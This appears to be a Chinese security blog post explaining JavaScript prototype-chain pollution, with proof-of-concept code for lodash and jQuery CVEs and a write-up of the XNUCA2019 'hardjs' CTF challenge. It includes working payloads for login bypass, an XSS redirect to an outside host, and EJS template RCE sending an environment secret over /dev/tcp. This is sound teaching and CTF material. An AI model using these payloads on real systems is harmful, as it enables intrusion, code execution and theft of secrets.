**原创： Mr.zhang 合天智汇  
**

 **0x00 正文**

* * *

 **  
**想了解什么是JavaScript可到合天网安实验室学习实验——Javascript基础，学习DOM操作和BOM操作，点击
http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017041815391500001开始学习。

  

 **原型和原型链**

JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义。也就是说，我们定义了一个函数，就会有对应的一个类，类名为该函数名。

 **原型**

每个函数对象都会有个prototype属性，它指向了该构建函数实例化的原型。使用该构建函数实例化对象时，会继承该原型中的属性及方法。

所有的对象都有__proto__属性，它指向了创建它的构建函数的原型。

在P神的介绍JavaScript原型污染攻击文章中我们可以知道以下两个性质。

  1. prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法

  2. 一个对象的__proto__属性，指向这个对象所在的类的prototype属性

 **原型链**

所谓原型链也是指JS中的一个继承和反向查找的机制，函数对象可以通过prototype属性找到函数原型，普通实例对象可以通过__proto__属性找到构建其函数的原型。

JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链

  1. 每个构造函数(constructor)都有一个原型对象(prototype)

  2. 对象的__proto__属性，指向类的原型对象prototype

  3. JavaScript使用prototype链实现继承机制

具体的可以参考下面的解释图（参考链接见附录）

![640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdndYl7D17OlkhX3mP9GjtoDQfHx7wF7IyibSxQgTNia5UFo4JLo69pxeNnTEnZiaiawr53FO8qnT7dkg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

 **原型链污染**

原型污染是指将属性注入现有JavaScript语言构造原型（如对象）的能力。

JavaScript允许更改所有Object属性，包括它们的神奇属性，如`_proto_`，`constructor`和`prototype`。

在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象，所有JavaScript对象通过原型链继承，都会继承Object.prototype上的属性，这种攻击方式就是
**原型链污染** 。

当发生这种情况时，有可能会被攻击者利用从而注入攻击代码达到篡改程序或者执行命令的目的。

 **原型链污染出现的情况**

根据p神文章所说，原型链污染主要是因为攻击者可以设置`__proto__`的值，导致污染，因此我们的目光应该瞄准哪些地方可以设置`__proto__`的值，或者说寻找某些对象，可以控制其键名的操作。

比如：

  * 对象merge

  * 对象clone（将待操作对象merge到一个空对象中）

举个例子：

假如存在一个merge操作：

    
    
    function merge(target, source) {    for (let key in source) {        if (key in source && key in target) {            merge(target[key], source[key])        } else {            target[key] = source[key]        }    }}

这里没有对键值进行过滤，假如key为`__proto__`，那么就可以进行原型链污染。  

这里需要注意，要配合JSON.parse使得我们输入的`__proto__`被解析成键名，JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，否则它只会被当作当前对象的”原型“而不会向上影响，例如：

    
    
    >let o2 = {a: 1, "__proto__": {b: 2}}>merge({}, o2)<undefined  
    >o2.__proto__<{b: 2}           //直接返回对应值  
    >console.log({}.b)<undefined        //并未污染原型  
    >let o3 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')>merge({},o3)<undefined  
    >console.log({}.b)<2                //原型被成功污染

 **CVE-2019-10744** **Lodash.defaultsDeep**

    
    
     https://snyk.io/vuln/SNYK-JS-LODASH-450202//Affecting lodash package, versions <4.17.12

Lodash是一个一致性、模块化、高性能的JavaScript
实用原生库，不需要引入其他第三方依赖，意在提高开发者效率，提高JS原生方法性能。它通过降低array、number、objects、string
等等的使用难度从而让 JavaScript 变得更简单。此软件包的＜4.17.12版本会受到原型污染的影响。

在Lodash库中`defaultsDeep`函数可以进行构造函数（constructor）重载，通过构造函数重载的方式可以欺骗添加或修改Object.prototype的属性，这个性质可以被用于原型污染。

验证POC：

    
    
    const mergeFn = require('lodash').defaultsDeep;const payload = '{"constructor": {"prototype": {"a0": true}}}'  
    function check() {    mergeFn({}, JSON.parse(payload));    if (({})[`a0`] === true) {        console.log(`Vulnerable to Prototype Pollution via ${payload}`);    }  }  
    check();

 **CVE-2019-11358**

 **JQuery＜=3.4.0中的$.extend**

在`./src/core.js`中：

    
    
    155: if ((options = arguments[ i ]) != null)

如果传入的参数arguments[i]不为空，将赋值给options，随后会逐个取出并赋值给copy

    
    
    158: for (name in options) {  
    159:     copy= options [name];

因此copy值为外部可控

    
    
    183: target[name] = jQuery.extend (deep,clone, copy);

随后使用jQuery的extend函数将copy对象的内容合并到目标对象clone中，deep是它的可选参数，指示是否深度合并该对象，默认为false，如果为true，且多个对象的同名属性也都是对象，则该“属性对象“的属性也将进行合并。其中，extend函数有以下两个需要注意的地方：

  1. 如果只为$.extend()指定了一个参数，则意味着参数target被省略。此时，target就是jQuery对象本身。通过这种方式，我们可以为全局对象jQuery添加新的函数。

    
    
    127：target = arguments[ 0 ] || {},

  1. 如果多个对象具有相同的属性，则后者会覆盖前者的属性值。

在小于3.4.0版中extend方法不作检查，把copy对象合并到target对象中

    
    
    187：target[name] = copy;

如果 name 可以为 `__proto__`，则会向上影响target 的原型，进而覆盖造成原型污染。

下面为验证POC

    
    
    >let b = $.extend(true,{},JSON.parse('{"__proto__":{"vuln": true}}')) <undefined >console.log({}.vuln); <true <undefined

可以看到当已经发生了原型污染

在补丁中可以看到对属性值进行了过滤：

    
    
    for ( name in options ) { copy = options[ name ]; // Prevent Object.prototype pollution // Prevent never-ending loop if ( target === copy ) { if ( name === "__proto__" || target === copy ) { continue; }

 **Node.js中命令执行**

在Node.js中有时需要执行一些系统命令，这时候会用到`child_process`模块，该模块翻译过来就是子进程，主要通过产生子进程来执行系统命令。

    
    
    global.process.mainModule.require('child_process').exec global.process.mainModule.constructor._load('child_process').exec

 **0X01 题目：XNUCA2019 hardjs**

* * *

方法一：JQuery中$.extend污染+前端XXS

在robot.py里面可以看到FLAG是藏在主机的环境变量中，并赋值给password。  

    
    
    username = "admin" password = os.getenv("FLAG")

首先，利用JQuery中$.extend污染session

在server.js中，对用户进行如下判断：

    
    
    function auth(req,res,next){    // var session = req.session;    if(!req.session.login || !req.session.userid ){        res.redirect(302,"/login");    } else{        next();    }    }

通过前面的一些知识我们可以知道，在调用一个不存在的属性key时，结果会返回undefined，比如

    
    
    >function a(){}<undefined>a.aaa<undefined>let b = new a()<undefined>b.aaa<undefined

那么`req.session.login`以及`req.session.userid`在用户未登录之前的值也是`undefined`的，按照之前所学习的原型链污染，如果我们能污染Object，那么我们只需要修改Object里的login和userid为true或者1，那么在session找不到login和userid两个属性值时就会向父对象进行查找，一直到找到父对象具有这两个属性值或者查找到NULL为止，因为Object里的login和userid已经被污染，因此可以任意用户登录。  

在app.js中使用了存在漏洞的jQuery版本并使用了$.extend方法

    
    
    function getAll(allNode){  
      $.ajax({    url:"/get",    type:"get",    async:false,    success: function(datas){      for(var i=0 ;i<datas.length; i++){        $.extend(true,allNode,datas[i])      }      // console.log(allNode);    }  })}

因此我们可以污染原型，首先向add路由请求6次，因为记录条数大于5才会执行合并  

server.js中

    
    
    else if(dataList[0].count > 5) { // if len > 5 , merge all and update mysql                console.log("Merge the recorder in the database.");   
            var sql = "select `id`,`dom` from  `html` where userid=? ";        var raws = await query(sql,[userid]);        var doms = {}        var ret = new Array();   
            for(var i=0;i<raws.length ;i++){            lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));  
                var sql = "delete from `html` where id = ?";            var result = await query(sql,raws[i].id);        }
    
    
    {"type":"test","content":{"constructor":{"prototype":{"login":true,"userid":1}}}}  
    

然后访问一下get路由来触发$.extend来污染原型

所以现在可以以任意用户登录。

在所给的robot.py中我们可以看到以下设置：

    
    
    chrome_options.add_argument('--disable-xss-auditor') chrome_options.add_argument('--no-sandbox')

可以看到bot利用selenium打开网站首页，原本是会跳转到login的，而密码就是flag，但是我们对原型进行了污染使得可以直接登录了网站首页，如果我们能在前端（即网站首页）进行XSS，再加上bot原来就会执行一次login的发送动作，那么我们就可以在首页构造一个form使得bot执行的submit动作指向我们的服务器，所以我们就可以获取到提交的password也就是flag了。

继续查看代码，看看页面时如何进行渲染的，在前端app.js中，用js生成模板时，遍历了hints数组并将hints数组里面的内容写入到对应li标签中，header、notice、wiki、button和message都会被渲染进sandbox中

    
    
    this.sandbox.setAttribute('sandbox', 'allow-same-origin')

即使我们可以写表单，也无法提交，数据中的js不会被执行。

    
    
    for (key in dom){          switch(key){            case 'header':              $tmp = $("li[type='header']");              $newNode = $( $tmp.html() );              $newNode.find("span.content").html(dom[key][0]);  
                  // console.log($newNode.html());  
                  viewport.appendChild( $newNode[0] );              break;            case "notice":              // console.log(dom[key]);              $tmp = $("li[type='notice']");              $newNode = $( $tmp.html() );              $newNode.find("span.content").html(dom[key][0]);              viewport.appendChild( $newNode[0] );  
                  break;            case "wiki":              // console.log(dom[key]);  
                  $tmp = $("li[type='wiki']");              $newNode = $( $tmp.html() );              $newNode.find("span.content").html(dom[key][0]);              viewport.appendChild( $newNode[0] );  
                  break;            case "button":              // console.log(dom[key]);  
                  $tmp = $("li[type='button']");              $newNode = $( $tmp.html() );              $newNode.find("span.content").html(dom[key][0]);              viewport.appendChild( $newNode[0] );  
                  break;            case "message":              // console.log(dom[key]);              $tmp = $("li[type='message']");              $newNode = $( $tmp.html() );  
                  $newNode.find("span.content").html(dom[key][0]);              viewport.appendChild( $newNode[0] );              break;            default:              console.log(key,":",dom[key]);          }  
            }

接着看  

    
    
    (function(){    var hints = {      header : "自定义内容",      notice: "自定义公告",      wiki : "自定义wiki",      button:"自定义内容",      message: "自定义留言内容"    };    for(key in hints){      // console.log(key);      element = $("li[type='"+key+"']");       if(element){        element.find("span.content").html(hints[key]);      }    }  })();

如果在前端页面能找到li标签且含有type属性，那么就可以考虑污染logger变量，使得hints数组也含有logger属性，从而把logger的内容打印到页面中，且避开sandbox，这样就可以执行XSS了

    
    
    <li type="logger">          <div class="col-sm-12 col-sm-centered">              <pre class="am-pre-scrollable">                  <span class="am-text-success">[Tue Jan 11 17:32:52 9]</span> <span class="am-text-danger">[info]</span> <span class="content">StoreHtml init success .....</span>              </pre>          </div>      </li>

进行XSS，诱导bot把数据提交到指定服务器，这里需要注意的是在污染session成功以后，需要用useid=1的账号来进行logger的污染，当提交次数大于5之后，访问get路由，触发server.js中的lodash.defaultsDeep(doms,JSON.parse(
raws[i].dom ));成功污染，把flag打到VPS  

    
    
    {"type":"test","content":{"__proto__": {"logger": "<script>window.location='http://wonderkun.cc/hack.html'</script>"}}}

### 方法二：后端RCE之opts.outputFunctionName

    
    
    const ejs = require('ejs')

该项目使用ejs库作为模板引擎，由于该模板引擎中通常会有eval等操作用于解析，因此可以去看ejs的存在原型链污染的地方。

查看ejs源码可以发现，很大一部分调用全是为了动态拼接一个js语句，当`opts`存在属性`outputFunctionName`时,该属性`outputFunctionName`便会被直接拼接到这段js中。

    
    
    if (!this.source) {      this.generateSource();      prepended += '  var __output = [], __append = __output.push.bind(__output);' + '\n';      if (opts.outputFunctionName) {        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';      }      if (opts._with !== false) {        prepended +=  '  with (' + opts.localsName + ' || {}) {' + '\n';        appended += '  }' + '\n';      }      appended += '  return __output.join("");' + '\n';      this.source = prepended + this.source + appended;    }

然后根据拼接的内容，生成动态函数

    
    
    try{  ctor = (new Function('return (async function(){}).constructor;'));}.....else {        ctor = Function;      }      fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);    }

此处如果可以控制opts.outputFunctionName为恶意代码，即可实现RCE  

附上出题者的payload

    
    
    {"type":"test","content":{"constructor":{"prototype":{"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG>/dev/tcp/xxxxx/xx\"')//"}}}}

拼接到后端的动态函数则是：

    
    
    prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';// After injectionprepended += ' var a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG>/dev/tcp/xxxxx/xx\"')// 后面的代码都被注释了'

污染了原型链之后，渲染直接变成了执行代码，并提前 return，从而 getshell  

### 方法三：后端RCE之opts.escapeFunction

同样可以找到另外一处地方

    
    
    var escapeFn = opts.escapeFunction;var ctor;....if (opts.client) {    src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;    if (opts.compileDebug) {        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;    }}

伪造escapeFunction也可以打到RCE

    
    
    {"constructor": {"prototype": {"client": true,"escapeFunction": "1; returnprocess.env.FLAG","debug":true, "compileDebug": true}}}

0X02 参考

* * *

https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html

https://blog.csdn.net/cc18868876837/article/details/81211729

https://blog.sari3l.com/posts/81dfbfaf/#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E5%BA%93

https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs

https://www.xmsec.cc/prototype-pollution-notes/

https://www.anquanke.com/post/id/177093

https://snyk.io/vuln/SNYK-JS-LODASH-450202

https://github.com/jquery/jquery/pull/4333

https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/

https://juejin.im/post/5b07eb1c5188254e28710d80

https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

